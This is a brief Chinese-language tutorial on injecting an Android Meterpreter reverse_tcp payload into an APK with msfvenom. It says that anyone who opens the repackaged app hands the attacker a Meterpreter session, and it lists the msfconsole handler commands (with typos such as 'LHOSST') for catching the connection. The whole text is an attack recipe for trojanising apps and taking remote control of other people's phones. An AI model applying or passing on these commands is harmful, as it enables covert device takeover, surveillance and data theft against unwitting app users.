msf向存在漏洞的apk注入payload
===========

命令：`msfvenom -x /路径/apk -p android/meterpreter/reverse_tcp LHOST=ip LPORT=端口`

只要别人一打开这个被注入payload后的软件就可以获得meterpreter

当然你要启动msfconsole监听

msfconsole

haled模块

set LHOSST 127.0.0.1

set LPORT 你设置的端口

set PAYLOAD android/meterpreter/reverse_tcp

exploit